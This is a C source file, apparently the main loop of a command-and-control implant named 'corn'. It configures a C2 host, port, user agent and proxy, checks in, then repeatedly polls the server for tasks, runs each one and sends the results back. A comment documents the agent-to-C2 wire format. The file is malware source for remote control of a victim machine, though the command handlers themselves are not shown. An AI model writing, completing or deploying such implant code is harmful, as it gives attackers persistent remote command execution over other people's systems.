#include "main.h"


CONFIG_CORN corn_config = {0}; // initial

int SetupAgentConfig(void){
    corn_config.AgentID = (PCHAR)initUUID;
    corn_config.HostName = (PWCHAR)hostname;
    corn_config.HttpPort = (DWORD)httpport;
    corn_config.HttpMethod = (PWCHAR)httpmethod;
    corn_config.EndPoint = (PWCHAR)endpoint;
    corn_config.UserAgent = (PWCHAR)useragent;
    corn_config.IsSSL = (BOOL)isssl;
    corn_config.IsProxyEnabled = (BOOL)proxyenabled;
    corn_config.ProxyURL = (PWCHAR)proxyurl;
    corn_config.SleepTime = (UINT32)sleeptime;
}

int main(void){
    SetupAgentConfig();

    // prototype
    sendChekin();


    sleep(10);

    PPackage prevResults = NULL;
    // command roop
    while(TRUE){
        PPackage package = newPackage(TRUE);

        if(prevResults != NULL){
        addBytes(package, prevResults->buffer, prevResults->size);
        freePackage(prevResults);
        prevResults = NULL;
        }

        PParser parser = sendAndReceive(package->buffer, package->size);
        freePackage(package);

        if(parser == NULL){
        sleep(corn_config.SleepTime);
        continue;
        }

        prevResults = newPackage(FALSE);

        BYTE taskCount = getTaskCount(parser);
        for(BYTE i = 0; i < taskCount; i++){
        PCommand cmd = tlvReadField(parser);
        PCmdResult result = dispatchCommand(cmd);

        tlvWriteField(prevResults, result);

        freePCommand(cmd);
        freeCmdResult(result);
        }
        freeParser(parser);

        sleep(corn_config.SleepTime);
    }
    return 0;
}



/*
send Bytes

agent -> C2

Header:
  AgentUUID (36bytes)

Result[0]:
  TaskUUID (36bytes)
  success   (1byte)
  type     (1byte)
  length   (4bytes)
  value    (n bytes)

Result[1]:
  TaskUUID (36bytes)
  success   (1byte)
  type     (1byte)
  length   (4bytes)
  value    (n bytes)
*/